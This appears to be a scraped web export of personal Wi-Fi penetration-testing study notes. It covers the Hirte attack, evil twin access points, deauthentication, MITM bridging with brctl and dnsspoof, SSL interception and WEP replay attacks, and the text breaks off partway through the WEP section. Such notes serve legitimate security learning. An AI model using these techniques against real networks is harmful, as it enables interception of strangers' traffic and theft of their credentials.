Nitti Menlo Courier monospace Twemoji Noto Color Emoji Noto Sans Mono CJK KR highlight-default color rgba 55 53 47 1 highlight-gray color rgba 120 119 116 1 fill rgba 120 119 116 1 highlight-brown color rgba 159 107 83 1 fill rgba 159 107 83 1 highlight-orange color rgba 217 115 13 1 fill rgba 217 115 13 1 highlight-yellow color rgba 203 145 47 1 fill rgba 203 145 47 1 highlight-teal color rgba 68 131 97 1 fill rgba 68 131 97 1 highlight-blue color rgba 51 126 169 1 fill rgba 51 126 169 1 highlight-purple color rgba 144 101 176 1 fill rgba 144 101 176 1 highlight-pink color rgba 193 76 138 1 fill rgba 193 76 138 1 highlight-red color rgba 212 76 71 1 fill rgba 212 76 71 1 highlight-gray background background rgba 241 241 239 1 highlight-brown background background rgba 244 238 238 1 highlight-orange background background rgba 251 236 221 1 highlight-yellow background background rgba 251 243 219 1 highlight-teal background background rgba 237 243 236 1 highlight-blue background background rgba 231 243 248 1 highlight-purple background background rgba 244 240 247 0 8 highlight-pink background background rgba 249 238 243 0 8 highlight-red background background rgba 253 235 236 1 block-color-default color inherit fill inherit block-color-gray color rgba 120 119 116 1 fill rgba 120 119 116 1 block-color-brown color rgba 159 107 83 1 fill rgba 159 107 83 1 block-color-orange color rgba 217 115 13 1 fill rgba 217 115 13 1 block-color-yellow color rgba 203 145 47 1 fill rgba 203 145 47 1 block-color-teal color rgba 68 131 97 1 fill rgba 68 131 97 1 block-color-blue color rgba 51 126 169 1 fill rgba 51 126 169 1 block-color-purple color rgba 144 101 176 1 fill rgba 144 101 176 1 block-color-pink color rgba 193 76 138 1 fill rgba 193 76 138 1 block-color-red color rgba 212 76 71 1 fill rgba 212 76 71 1 block-color-gray background background rgba 241 241 239 1 block-color-brown background background rgba 244 238 238 1 block-color-orange background background rgba 251 236 221 1 block-color-yellow background background rgba 251 243 219 1 block-color-teal background background rgba 237 243 236 1 block-color-blue background background rgba 231 243 248 1 block-color-purple background background rgba 244 240 247 0 8 block-color-pink background background rgba 249 238 243 0 8 block-color-red background background rgba 253 235 236 1 select-value-color-pink background-color rgba 245 224 233 1 select-value-color-purple background-color rgba 232 222 238 1 select-value-color-green background-color rgba 219 237 219 1 select-value-color-gray background-color rgba 227 226 224 1 select-value-color-opaquegray background-color rgba 255 255 255 0 0375 select-value-color-orange background-color rgba 250 222 201 1 select-value-color-brown background-color rgba 238 224 218 1 select-value-color-red background-color rgba 255 226 221 1 select-value-color-yellow background-color rgba 253 236 200 1 select-value-color-blue background-color rgba 211 229 239 1 checkbox display inline-flex vertical-align text-bottom width 16 height 16 background-size 16px margin-left 2px margin-right 5px checkbox-on background-image url data image svg xml charset UTF-8 3Csvg 20width 3D 2216 22 20height 3D 2216 22 20viewBox 3D 220 200 2016 2016 22 20fill 3D 22none 22 20xmlns 3D 22http 3A 2F 2Fwww w3 org 2F2000 2Fsvg 22 3E 0A 3Crect 20width 3D 2216 22 20height 3D 2216 22 20fill 3D 22 2358A9D7 22 2F 3E 0A 3Cpath 20d 3D 22M6 71429 2012 2852L14 204 9995L12 7143 203 71436L6 71429 209 71378L3 28571 206 2831L2 207 57092L6 71429 2012 2852Z 22 20fill 3D 22white 22 2F 3E 0A 3C 2Fsvg 3E checkbox-off background-image url data image svg xml charset UTF-8 3Csvg 20width 3D 2216 22 20height 3D 2216 22 20viewBox 3D 220 200 2016 2016 22 20fill 3D 22none 22 20xmlns 3D 22http 3A 2F 2Fwww w3 org 2F2000 2Fsvg 22 3E 0A 3Crect 20x 3D 220 75 22 20y 3D 220 75 22 20width 3D 2214 5 22 20height 3D 2214 5 22 20fill 3D 22white 22 20stroke 3D 22 2336352F 22 20stroke-width 3D 221 5 22 2F 3E 0A 3C 2Fsvg 3E style The PDF version of these notes can be found a href https 0xd4y com misc Wi-Fi Pentesting Notes pdf here a head body article id 7d71289c-4030-4c7b-9668-298dce547d7e class page sans header img class page-cover-image src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e YouTube Banner png style object-position center 50 h1 class page-title Wi-Fi Pentesting Notes h1 header div class page-body h1 id 047c572c-9c8e-4b25-90ba-2a97bd54bc78 class Contact h1 p id 2836decd-09f0-425a-9d9e-cd7c2e834bb6 class strong strong strong strong strong strong strong strong strong LinkedIn strong strong strong strong strong strong strong strong strong a href https www linkedin com in segev-eliezer https www linkedin com in segev-eliezer a p p id 457d67dc-6411-4b80-98a6-5d968d84483a class strong YouTube strong a href https YouTube com 0xd4y https YouTube com 0xd4y a p p id d523ebf1-1e31-4839-bbc1-77bec2a33a5b class strong strong strong strong Website strong strong strong strong a href https 0xd4y com https 0xd4y com a p p id f4651c78-82ea-401c-90a0-775f5a7510a1 class strong strong strong strong strong strong GitHub strong strong strong strong strong strong a href https GitHub com 0xd4y https GitHub com 0xd4y a p h1 id 9c0dd53b-4949-4e78-9c4c-ee3e43d3f1c7 class Table of Contents h1 nav id 5014043f-e193-489a-8c43-5cc56e928996 class block-color-gray table of contents div class table of contents-item table of contents-indent-0 a class table of contents-link href 047c572c-9c8e-4b25-90ba-2a97bd54bc78 Contact a div div class table of contents-item table of contents-indent-0 a class table of contents-link href 9c0dd53b-4949-4e78-9c4c-ee3e43d3f1c7 Table of Contents a div div class table of contents-item table of contents-indent-0 a class table of contents-link href b4715e54-dccf-4ef8-bb24-b8fdd74b4cb3 Fragmentation and Hirte Attack a div div class table of contents-item table of contents-indent-1 a class table of contents-link href 91f30dd1-0bda-49e9-bbda-404eae2f3f6d Fragmentation a div div class table of contents-item table of contents-indent-1 a class table of contents-link href 4c31a3bb-313c-472d-a844-76f9932c8406 Hirte Attack a div div class table of contents-item table of contents-indent-1 a class table of contents-link href 578f8abb-eadc-4b7e-947f-51a7fef35cf2 Hidden SSID a div div class table of contents-item table of contents-indent-2 a class table of contents-link href a27d3909-38d5-4592-b604-447673f0e406 Detection Techniques a div div class table of contents-item table of contents-indent-1 a class table of contents-link href 5b39154a-9d87-491d-8618-5fba6b6acca2 MAC Filter a div div class table of contents-item table of contents-indent-1 a class table of contents-link href be32fbd3-3cfa-42b4-8957-89117c97ee5c WLAN Authentication a div div class table of contents-item table of contents-indent-1 a class table of contents-link href 6b9e6e30-f8cc-401e-b5e2-e96401b3d506 Hotspot Attacks a div div class table of contents-item table of contents-indent-1 a class table of contents-link href 82a3941b-45cc-46d7-ae24-d634eb5ae3f4 Hacking Isolated Clients a div div class table of contents-item table of contents-indent-2 a class table of contents-link href b84ea68f-77cc-415f-a104-b5a48cdd72c9 Client Authentication to Attacking Machine a div div class table of contents-item table of contents-indent-2 a class table of contents-link href 81f7c537-8d3f-4bd5-ac83-49a586e4c089 MITM a div div class table of contents-item table of contents-indent-2 a class table of contents-link href 8e720825-6268-4478-9d40-eb29843e107a MITM SSL a div div class table of contents-item table of contents-indent-1 a class table of contents-link href 42f43893-8a77-48e3-a9ef-35e19fdbe0d1 SSID a div div class table of contents-item table of contents-indent-0 a class table of contents-link href 2b5b9873-8f36-43c2-a137-139637c10516 WEP Wired Equivalent Privacy Attacks a div div class table of contents-item table of contents-indent-1 a class table of contents-link href 5959000b-ee52-4531-a777-1ede1d7ff6ce Replay Attack a div div class table of contents-item table of contents-indent-1 a class table of contents-link href b5d00a7c-4da7-4857-8634-70715e2be29f Caffe Latte Attack a div div class table of contents-item table of contents-indent-1 a class table of contents-link href bd10e671-30df-4ea1-a99e-f34ac1b497cd Korek x27 s ChopChop a div div class table of contents-item table of contents-indent-0 a class table of contents-link href d5a22266-1a81-4119-9e6f-b2196fb6977b Wi-Fi Gear a div div class table of contents-item table of contents-indent-1 a class table of contents-link href e34f6b01-274b-48f9-a72e-8b9f9bfcc649 External Wireless Card a div div class table of contents-item table of contents-indent-0 a class table of contents-link href 5dd9e72e-5c7e-4d47-8794-67cbec35470e WLAN Headers a div div class table of contents-item table of contents-indent-1 a class table of contents-link href c21a9d2d-a7fb-433d-95e1-605c25f3b6fb Terminology a div div class table of contents-item table of contents-indent-1 a class table of contents-link href 2a57f38a-69fc-4ae6-9131-c17d691c2452 WLAN Packet Header a div div class table of contents-item table of contents-indent-2 a class table of contents-link href 6ee5195a-7ecd-416e-bc49-d8f9f7ad72bd Frame Control Field a div div class table of contents-item table of contents-indent-2 a class table of contents-link href 3335e111-f41c-4d98-8990-4667682c907d Duration ID a div div class table of contents-item table of contents-indent-2 a class table of contents-link href 47116a5d-b4f6-414c-b0c4-ffeb1a358cdf Address 1-4 a div div class table of contents-item table of contents-indent-2 a class table of contents-link href 7c4edaf1-62f9-4ad8-9f1a-bec30c6e11b3 Sequence Control a div div class table of contents-item table of contents-indent-2 a class table of contents-link href aec44b3b-d234-46f3-a254-11ba63328aa5 QOS Control a div div class table of contents-item table of contents-indent-2 a class table of contents-link href 9e133d71-2f6b-42e5-864c-b9ef650b9036 Frame Body a div div class table of contents-item table of contents-indent-2 a class table of contents-link href 14549fe5-8bde-41a3-b8d1-75b516f49b90 FCS a div div class table of contents-item table of contents-indent-0 a class table of contents-link href 3ccad7d1-ca6f-4022-bb8d-83c48674b86c WPA2 -PSK a div div class table of contents-item table of contents-indent-0 a class table of contents-link href c0139b76-48d0-4690-993d-8f0a0537c497 WPA-PSK a div div class table of contents-item table of contents-indent-1 a class table of contents-link href cb984586-4d96-487e-9ebc-01fa3926ccfe Cracking WPA-PSK a div div class table of contents-item table of contents-indent-2 a class table of contents-link href 323bda25-24c4-452a-ae07-d94118ff2034 Dictionary Attack a div div class table of contents-item table of contents-indent-1 a class table of contents-link href 59cc6f47-63c4-4218-bc8a-e39871d52daf Keys a div div class table of contents-item table of contents-indent-2 a class table of contents-link href 54ef2dc6-b68c-40c1-81af-3ec69131243a WPA-PSK Authentication Further Explanation a div div class table of contents-item table of contents-indent-0 a class table of contents-link href e6e96896-eedf-4950-9fa6-a9dda8fadfa0 Detecting Spoofing Attacks a div div class table of contents-item table of contents-indent-1 a class table of contents-link href 66ca8987-f182-4f19-bcca-2a5bec020e04 SSID Spoofing a div div class table of contents-item table of contents-indent-1 a class table of contents-link href 8924ea08-d242-4547-af07-cadb07e098d8 Mac Spoofing a div div class table of contents-item table of contents-indent-0 a class table of contents-link href 25884ae3-b113-4ab6-98cf-59c6643b7492 Wireless IDS and IPS a div div class table of contents-item table of contents-indent-0 a class table of contents-link href dbe474d1-e3f2-49e2-9432-323071ef92ef Malicious SSID a div div class table of contents-item table of contents-indent-1 a class table of contents-link href 0462bf13-21d3-47d5-9fd9-47cc33e313a4 HTML Injection and XSS a div div class table of contents-item table of contents-indent-1 a class table of contents-link href 56901a54-d79d-4327-a07a-f1494e13a424 SQLi a div nav h1 id b4715e54-dccf-4ef8-bb24-b8fdd74b4cb3 class Fragmentation and Hirte Attack h1 h2 id 91f30dd1-0bda-49e9-bbda-404eae2f3f6d class Fragmentation h2 ul id ed9d282e-c608-4611-89f2-296a73261c8e class bulleted-list li style list-style-type disc when large frame is to be transmitted but larger than maximum transferrable unit for network the frame needs to be broken up into fragments li ul ul id 4d3a5a2d-5f24-4711-9ee3-a47b9e477622 class bulleted-list li style list-style-type disc located within the quot Sequence Control quot header field ul id 9ec46f73-6ead-4734-97f6-3ce03424534d class bulleted-list li style list-style-type circle see WLAN Headers li ul figure id 0b92d21f-fdc7-4c28-9325-06cbd5e5f28d class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled png img style width 1180px src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled png a figure li ul ul id c79087e5-4930-4ba8-9da2-797ece0a32e0 class bulleted-list li style list-style-type disc sequence number stays constant but fragment number changes li ul ul id e17ee5ef-f5cc-4b0b-99b1-31d3cd57539b class bulleted-list li style list-style-type disc quot more Frag quot more fragmentd bit set to 1 for all fragmented packets except for the last one li ul ul id 2808e0ed-453a-49ad-a86a-eccf450121a6 class bulleted-list li style list-style-type disc indicates that more fragment packets are yet to be sent receiver waits and doesn x27 t reassemble packet until this bit set to 0 li ul figure id 916a68e6-8aa3-490b-a0a9-49bb0eaea45a class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 201 png img src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 201 png a figure h2 id 4c31a3bb-313c-472d-a844-76f9932c8406 class Hirte Attack h2 ol type 1 id 68f456ed-003c-4370-a8ec-5c9886c667be class numbered-list start 1 li Setup a fake WEP AP and wait for a client to connect li ol ol type 1 id b88cb506-20d6-4a60-b66b-d5986a80bf1d class numbered-list start 2 li Upon connection of a client waits for auto-configuration IP address li ol ol type 1 id 68092460-69a1-4ea0-aa94-e5f97e608f98 class numbered-list start 3 li Client sends an ARP packet li ol ol type 1 id 8ac6be1b-86a5-4c66-b197-ea12c210d8d9 class numbered-list start 4 li Obtain the ARP packet and convert it into an ARP request for the same client ul id 83ecd968-aaee-4597-8379-a700d67b051e class bulleted-list li style list-style-type disc relocates IP address in ARP header using fragmentation li ul li ol ol type 1 id 5769193c-66d7-4be6-9d25-80f4c5673970 class numbered-list start 5 li Client replies li ol ol type 1 id 977f90c1-9cec-4a54-825d-933435777d52 class numbered-list start 6 li Collect these packets li ol ol type 1 id b7d88bea-a759-4463-87f1-50c2e2609995 class numbered-list start 7 li Crack the WEP key Hidden SSID MAC Filter and Authentication li ol h2 id 578f8abb-eadc-4b7e-947f-51a7fef35cf2 class Hidden SSID h2 ul id b2d00090-dfd1-45dc-bc8e-0ed564d8270b class bulleted-list li style list-style-type disc SSID broadcasting off in beacon frames li ul h3 id a27d3909-38d5-4592-b604-447673f0e406 class Detection Techniques h3 ol type 1 id abe2fc8d-443a-4136-9684-42e6bcb5175f class numbered-list start 1 li Passive ul id 99b0a97c-2bc4-429a-924f-c2aa9b980b84 class bulleted-list li style list-style-type disc monitor air for new client trying to associate with access point li ul ul id 78914e3d-0b27-4117-8ffd-700804f7556e class bulleted-list li style list-style-type disc look for connection to the hidden SSID by monitoring probe and association packets ul id e1056954-06d7-4757-871a-1d9557e155cb class bulleted-list li style list-style-type circle the association and probe packets contain the SSID in the quot Tag interpretation quot parameter li ul li ul li ol ol type 1 id a731e267-6e25-41a7-8526-2188ea3176d2 class numbered-list start 2 li Active ul id 3152676c-bdfd-4402-aedc-a826d3f850b6 class bulleted-list li style list-style-type disc de-authenticate one or all clients and monitor reconnections ul id 75e78c60-0e70-439c-a32b-ef4322161521 class bulleted-list li style list-style-type circle when clients are disconnected they will try to reconnect and you can get the SSID as described in the quot Passive quot technique li ul li ul li ol p id eb09f443-c87a-490e-afbc-4a00332ddcf7 class strong How to Deauthenticate strong p figure id 4e20a0e7-ac26-45a7-b8f9-0c69c43b598a class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 202 png img style width 686px src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 202 png a figure ul id 50c3d218-a86e-4da8-b35d-d6e7a6c2103c class bulleted-list li style list-style-type disc when client deauthenticates a management packet called quot Deauthentication packet quot is sent from AP to client li ul h2 id 5b39154a-9d87-491d-8618-5fba6b6acca2 class MAC Filter h2 ul id c50f873e-be4b-45de-b532-44a9d29ab8ac class bulleted-list li style list-style-type disc MAC filter typically used with switches and filtering devices and firewalls ul id 1b214454-d6a4-42f1-a730-3f2f431311fb class bulleted-list li style list-style-type circle feature to whitelist MAC address on specific port li ul ul id 6b3ede77-36d7-4298-87ab-80448faf24fe class bulleted-list li style list-style-type circle MAC can be easily spoofed so whitelist is not secure li ul li ul ul id 292783b2-db7b-45ce-b51f-287b2547d873 class bulleted-list li style list-style-type disc MAC filter is a network layer filter li ul ul id d7fec6a8-bf5e-4dc7-beed-c3590fe2c6bf class bulleted-list li style list-style-type disc MAC addresses visible in plain text in WLAN header li ul ul id 600ca0d5-3776-474f-bdea-7628a823e2ef class bulleted-list li style list-style-type disc some access points use captive portals and add a device to a mac filtering list after it successfully authenticates li ul h2 id be32fbd3-3cfa-42b4-8957-89117c97ee5c class WLAN Authentication h2 figure id 9c0ba0c0-9861-426e-9aa8-79cc1f8738e9 class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 203 png img style width 683px src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 203 png a figure ol type 1 id 2fb9296d-4858-43e4-8f80-e67f3702c566 class numbered-list start 1 li STA asks to authenticate to AP li ol ol type 1 id 7a640b61-5646-4fa6-b6e1-971282b8104c class numbered-list start 2 li AP sends challenge response li ol ol type 1 id d9b45b0a-aa53-407a-8298-d28d78c637f3 class numbered-list start 3 li STA encrypts challenge with WEP password li ol ol type 1 id e45a990c-d36f-4973-858c-ca4e4afc8f99 class numbered-list start 4 li STA decrypts challenge with WEP password If matches grant access li ol ul id a2880eeb-46d4-4b50-a5d2-d3db416cc137 class bulleted-list li style list-style-type disc shared key authentication SKA is broken ul id 380a7ac7-5f3e-4b57-a8ac-714cb6efbe7f class bulleted-list li style list-style-type circle possible to retrieve the key by reversing XOR operation Hotspot Attacks and Hacking Isolated Clients MITM li ul li ul h2 id 6b9e6e30-f8cc-401e-b5e2-e96401b3d506 class Hotspot Attacks h2 ul id e9e0709a-c4d8-442e-8732-87f12d3ed799 class bulleted-list li style list-style-type disc no encryption li ul p id cc52867e-8796-44e1-aa11-54b783f98cf4 class span style border-bottom 0 05em solid Soft AP span access point created entirely in software p ul id 6bfe4d51-e048-4eb1-b95f-400406435ef7 class bulleted-list li style list-style-type disc evil twin ul id cd98ba90-e6da-464d-a94e-c2256c82e878 class bulleted-list li style list-style-type circle same ESSID as target can even set BSSID to be the same li ul ol type 1 id cd5ed502-1157-473d-94b3-e03f43ed78f0 class numbered-list start 1 li Attacker sets up AP with same SSID as target AP then sends deauth packet to victim li ol ol type 1 id 92d8c38d-ab6a-494f-9718-a38a3f4bf335 class numbered-list start 2 li After victim is deauthenticated their computer tries reconnecting to the SSID with same name and highest signal strength li ol ol type 1 id 25912ba7-b5e0-45de-a799-ee74901c8444 class numbered-list start 3 li The victim will automatically connect to attacker machine li ol li ul h2 id 82a3941b-45cc-46d7-ae24-d634eb5ae3f4 class Hacking Isolated Clients h2 ul id 6d59b74f-ea90-492a-bfd8-5cce25d006a1 class bulleted-list li style list-style-type disc when client connected to SSID that SSID is added to preferred network connection list li ul ul id a84a66a7-f5f5-441e-9601-5c4a6e11c04e class bulleted-list li style list-style-type disc client automatically connects to known SSIDs ul id a768a4b2-ce9b-42c3-8a59-21d04f4bcb03 class bulleted-list li style list-style-type circle client sends probe requests packets to locate known SSIDs in the preferred network connection list ul id 9ce60d67-1fa9-408a-bbd7-67e0ccc798f2 class bulleted-list li style list-style-type square span style border-bottom 0 05em solid Probe Request Packet span packet meant to locate available networks li ul figure id 9ce313a9-6de0-4f68-9a63-35d38ed64957 class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 204 png img style width 692px src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 204 png a figure li ul li ul ul id 1fcc8db8-3854-49d7-bef0-1bb3c3d57632 class bulleted-list li style list-style-type disc if true AP has no authentication then making a malicious AP with same SSID will likely not make the client automatically connect ul id e83825ad-f661-44f2-92e8-6f4953db9426 class bulleted-list li style list-style-type circle the client must manually connect to the malicious AP li ul li ul h3 id b84ea68f-77cc-415f-a104-b5a48cdd72c9 class Client Authentication to Attacking Machine h3 ul id 92961228-0576-4560-8bbd-56ee97a49466 class bulleted-list li style list-style-type disc client cannot authenticate AP li ul ul id acc99393-7dd5-4237-9c05-f59aa34a1bee class bulleted-list li style list-style-type disc SSID alone used to trust AP li ul ul id 8bd3bc43-4daf-491c-b8c2-e8bdcd2d84d1 class bulleted-list li style list-style-type disc easiest with Hotspot as it is open authentication with no encryption li ul h3 id 81f7c537-8d3f-4bd5-ac83-49a586e4c089 class MITM h3 p id 73e043f5-e911-4e1a-8771-0a3914aea6bb class Man in the middle p figure id d49c97e1-3f2b-460e-b635-304196b1154b class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 205 png img style width 688px src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 205 png a figure ul id bdd0ebf3-2243-45d5-b103-0f8d42c4757c class bulleted-list li style list-style-type disc hacker connected to internet via eth0 li ul ul id 8fef303b-5b90-4078-88ab-aa2f6a890089 class bulleted-list li style list-style-type disc hacker has fake AP on mon0 li ul ul id feedfdf7-3a14-443c-891f-8fba4b53b6f3 class bulleted-list li style list-style-type disc create bridge between mon0 and eth0 ul id 1f2c05c1-088b-482f-b3c0-916ab5fb0b71 class bulleted-list li style list-style-type circle code brctl addbr lt name of bridge gt code li ul ul id 31a95c40-8207-46ae-a5fc-62829de28905 class bulleted-list li style list-style-type circle code ifconfig lt name of bridge gt up code li ul li ul h3 id 8e720825-6268-4478-9d40-eb29843e107a class MITM SSL h3 ul id acc8479b-5e95-47fa-acb5-2793bcc0e305 class bulleted-list li style list-style-type disc code dnsspoof -i lt name of bridge gt code li ul ul id 403c4bf7-08bf-4881-93c7-56d92bb08e76 class bulleted-list li style list-style-type disc victim will connect to spoofed DNS upon a DNS query because dnsspoof will respond faste than true DNS li ul ul id 62ca57b2-0fa4-49aa-a6f3-f8a2eb37cb02 class bulleted-list li style list-style-type disc attack works even through SSL as client x27 s requests are being encrypted using spoofed cert which is then decrypted by the hacker note the hacker knows the encryption as they signed the certificate and then the traffic is forward to the requested resource using the requested resource x27 s certificate ul id 4e831cdf-d84d-4832-905e-4d15e8a2614b class bulleted-list li style list-style-type circle this same traffic works in the reverse process when the requested resource responds to the request and sends the traffic back to the victim li ul figure id fe603913-bc53-45a7-b2d5-42220d76bbc6 class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 206 png img style width 687px src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 206 png a figure ul id 23cf1c33-b898-4f22-a660-e2d532e6f3c4 class bulleted-list li style list-style-type circle note that there is a certificate error on victim device due to BurpSuite using self-generated certificate instead of certificate of requested service Misc Information li ul li ul h2 id 42f43893-8a77-48e3-a9ef-35e19fdbe0d1 class SSID h2 ul id 2ae65994-9ae7-4ad8-b807-1a3fa5e6a023 class bulleted-list li style list-style-type disc service set identifier SSID li ul ul id 3dea07b0-dc3b-4d2a-ab5f-b81a36d56026 class bulleted-list li style list-style-type disc name given to an access point or network consisting of multiple access points li ul ul id 7c2135e9-bd9d-4d85-833e-40e8b58fda28 class bulleted-list li style list-style-type disc beacon frames a k a broadcast frames are sent by access points to broadcast presence in current RF vicinity ul id d520ebcb-ab64-4bca-8a8d-ae77180ac7b7 class bulleted-list li style list-style-type circle this is how your computer finds nearby Wi-Fi networks to connect to li ul li ul ul id 39ef0467-c1d6-47ec-9157-956d3ef05c0c class bulleted-list li style list-style-type disc using MDK3 tool it is possible to spoof a network by sending beacon frames it even appears as high signal strength ul id afd754b1-2d02-4840-b6e6-4f0bf44acd96 class bulleted-list li style list-style-type circle easy to spoof 802 11 frames because there is no encryption Network Devices span style border-bottom 0 05em solid OSI span li ul li ul ul id 9583e8aa-dd3a-47ed-ab5e-49c053e94754 class bulleted-list li style list-style-type disc open systems interconnection model li ul ul id ef485b32-98f0-4b6a-a545-77d2abd3bba7 class bulleted-list li style list-style-type disc seven layers ol type 1 id 236654ab-5444-473b-8973-1bb4f75fa350 class numbered-list start 1 li Physical li ol ol type 1 id 547a0b4e-62bb-459c-b1e6-3886e459d494 class numbered-list start 2 li Data Link li ol ol type 1 id 85c08cad-f4e2-4272-9265-2ec97acd0e53 class numbered-list start 3 li Network li ol ol type 1 id ff8f131e-ee5f-43d6-a77b-f116fd708474 class numbered-list start 4 li Transport li ol ol type 1 id 44b49793-4c76-48e6-8b74-76b76bfe7f4c class numbered-list start 5 li Session li ol ol type 1 id 77d54f72-0b93-4a15-b3e6-42fde735962b class numbered-list start 6 li Presentation li ol ol type 1 id 18eff5fb-4628-4583-867a-8f64497d4b12 class numbered-list start 7 li Application li ol li ul p id 3bad9008-46f0-45f0-a4b0-987afe274bea class span style border-bottom 0 05em solid Switch span p ul id 3b69293d-5651-4ee8-9423-b3f8c66fa0ae class bulleted-list li style list-style-type disc layer 2 OSI device li ul ul id 4abf07aa-4256-443b-b095-a8a066ce3015 class bulleted-list li style list-style-type disc only communicate with local network devices li ul ul id 2bbfbe74-0243-4ce4-af1a-b0f91eaa2209 class bulleted-list li style list-style-type disc uses application-specific integrated circuit ASIC chip ul id 441a6e50-4162-480c-a998-014943022f66 class bulleted-list li style list-style-type circle ASIC chip tells switch which ports a device is connected to li ul li ul p id 2e072943-b5e6-4159-b77d-6e3a22ab068a class span style border-bottom 0 05em solid WAP span p ul id 59b6be11-9007-48bd-bf17-70a7441d1538 class bulleted-list li style list-style-type disc wireless access point li ul ul id 8d64cca5-4657-4bf8-bc59-f2bc0396179e class bulleted-list li style list-style-type disc layer 2 OSI device li ul ul id 5273e8a4-252f-47c0-a160-eb0ab5f947f8 class bulleted-list li style list-style-type disc only communicates with local network devices li ul p id 8818166e-245c-452e-9566-c4910c5ea497 class span style border-bottom 0 05em solid MLS span p ul id 1b9c3e2d-0653-454f-bb7a-80cbef2cf1e3 class bulleted-list li style list-style-type disc multilayer switch li ul ul id b65c16a1-28e1-47ff-aa8c-32c344af4996 class bulleted-list li style list-style-type disc provides layer 2 switching services and layer 3 or high OSI model services li ul ul id eb363de6-57a7-4cd6-a083-8083aabc42bb class bulleted-list li style list-style-type disc most common MLS is layer 3 switch li ul ul id 3a9576e7-e088-483f-90b2-20de053dcb2d class bulleted-list li style list-style-type disc uses ASIC chip for switching and handling routing functions li ul p id 9a28cc5c-64d8-4b55-812a-969e3af3c9ed class span style border-bottom 0 05em solid Router span p ul id 90bb9be4-80d7-4bcb-96a7-537b2c4b4421 class bulleted-list li style list-style-type disc layer 3 OSI device li ul ul id b9f63ed0-c88d-494a-8104-95d8a14a6e7b class bulleted-list li style list-style-type disc uses software for decision making li ul p id f3ea8a14-7f3a-46d2-b620-7e4d1799ec60 class span style border-bottom 0 05em solid Firewall span p ul id 346f72bb-1c24-4305-a3c4-be2472407ea8 class bulleted-list li style list-style-type disc can be software based or network appliance li ul ul id 4313601f-8821-4895-8a4b-1f46db040f86 class bulleted-list li style list-style-type disc functions at multiple OSI model layers usually 2 3 4 and 7 li ul ul id 769a8a33-dc52-4f36-8c84-af47e3f606c0 class bulleted-list li style list-style-type disc blocks packets in 2 different ways ul id 8762d4d3-a4d1-4b8d-b2f3-d89ee7312931 class bulleted-list li style list-style-type circle em Stateless inspection em examines every packet against set of rules li ul ul id 07a36ab7-5b20-44e1-9b3d-10d971d81560 class bulleted-list li style list-style-type circle em Stateful Inspection em examines state of connection between networks as general rules e g firewall blocks any outgoing traffic on port xxxx li ul li ul p id c51a85c0-5463-422c-9735-c1a2bfab589c class span style border-bottom 0 05em solid Load Balancer span p ul id 285d0a1a-cb75-4ca4-a740-dd24d29744ed class bulleted-list li style list-style-type disc also called content switch or content filter li ul ul id 4202538b-915c-4641-b99d-4dcc1f0360f1 class bulleted-list li style list-style-type disc used to ensure no single gets overloaded with traffic li ul p id 25cf97a5-f393-489a-a7ef-7d1dda52953c class span style border-bottom 0 05em solid Proxy Server span p ul id bac12d47-4a19-46a7-8675-d263aaac6698 class bulleted-list li style list-style-type disc often used to retrieve resources from outside untrusted networks ul id 350d73c6-784d-4c6d-ab5b-554765e1d896 class bulleted-list li style list-style-type circle can also be used to filter allowed content Useful Links a href https bootcamps pentesteracademy com course wifi-pentesting-july-21 Syllabus a a href https www youtube com watch v BWILgDt6jz0 Sequence Number a li ul li ul h1 id 2b5b9873-8f36-43c2-a137-139637c10516 class WEP Wired Equivalent Privacy Attacks h1 ul id 38ac54e9-2861-4ed9-a7aa-2720cf3bd017 class bulleted-list li style list-style-type disc first encryption scheme for Wi-Fi li ul ul id 59b08d49-33b5-49a7-aa22-5c38dbac67b8 class bulleted-list li style list-style-type disc insecure uses RC4 encryption ul id 9a045da6-b1ff-4aaf-801a-9f7323540c0f class bulleted-list li style list-style-type circle symmetric encryption transmitter and receiver have identical key for decrypting and encrypting li ul ul id 55e3907d-1314-43b2-8793-08316b20245e class bulleted-list li style list-style-type circle possible to tamper data figure id ffee5c66-cf92-4e99-809f-be410d72758a class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 207 png img style width 637px src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 207 png a figure li ul li ul ul id 808eaf7f-603d-4387-b279-299cedfc02af class bulleted-list li style list-style-type disc check quot Protected flag quot to see if it is set if set that means encryption is in place Example of encrypted package li ul figure id a2b5182e-3cad-4c1d-afad-8e1363b9d185 class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 208 png img style width 685px src Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 208 png a figure h2 id 5959000b-ee52-4531-a777-1ede1d7ff6ce class Replay Attack h2 ul id dce45b95-6429-4c75-93ed-4d5e4a5d1f62 class bulleted-list li style list-style-type disc noisy and easily detectable li ul ul id 5d217054-8149-4236-8a30-98a094486356 class bulleted-list li style list-style-type disc encrypted ARP packet can be identified due to its fixed length ul id bf518cba-4354-4c76-b998-f9fab3a50ade class bulleted-list li style list-style-type circle these ARP packets are captured by hacker and constantly replayed to AP until the AP responds with enough weak IVs in the ARP responses to crack the key li ul figure id 83b717b8-c4a0-4d1f-8e0c-24184e5f911f class image a href Wi-Fi 20Pentesting 20Notes 207d71289c40304c7b9668298dce547d7e Untitled 209 png img 